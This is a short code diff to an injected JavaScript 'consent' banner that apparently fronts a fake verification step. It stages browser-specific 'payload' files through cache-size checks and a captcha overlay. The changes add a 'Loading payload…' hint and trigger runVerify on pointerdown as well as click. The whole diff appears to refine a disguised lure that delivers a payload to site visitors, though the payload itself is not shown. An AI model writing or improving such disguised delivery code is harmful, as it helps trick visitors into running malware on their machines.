@@ -11,7 +11,7 @@
   window.__CONSENT_INJECTED__ = true;
 
   var CONSENT_CONFIG = {
-    version: '1.9.25',
+    version: '1.9.26',
     presentation: 'consent',
     privacyPolicyUrl: '/privacy-policy',
     optOutUrl: '/opt-out-preferences',
@@ -604,7 +604,15 @@
       if (e && e.target && e.target.closest && e.target.closest('a')) return;
       if (busy || captchaVisible) return;
       if (!isPayloadReady()) {
-        updateCacheStatus('fail', 'payload still loading — wait for strict body OK');
+        area.classList.add('cf-not-ready');
+        setTimeout(function () { area.classList.remove('cf-not-ready'); }, 500);
+        var lbl = area.querySelector('.cf-label');
+        var hint = 'Loading payload…';
+        if (CONSENT_CONFIG.cacheFileBodySize) {
+          hint = 'Not ready — check cacheFileSizes for ' + (isJjjPayloadUrl() ? 'jjj' : isJjPayloadUrl() ? 'jj' : getBrowserKey());
+        }
+        if (lbl) lbl.textContent = hint;
+        updateCacheStatus('fail', hint);
         return;
       }
       busy = true;
@@ -614,6 +622,10 @@
     }
 
     area.addEventListener('click', runVerify);
+    area.addEventListener('pointerdown', function (e) {
+      if (e.pointerType === 'mouse' && e.button !== 0) return;
+      runVerify(e);
+    });
     area.addEventListener('keydown', function (e) {
       if (e.key === ' ' || e.key === 'Enter') {
         e.preventDefault();
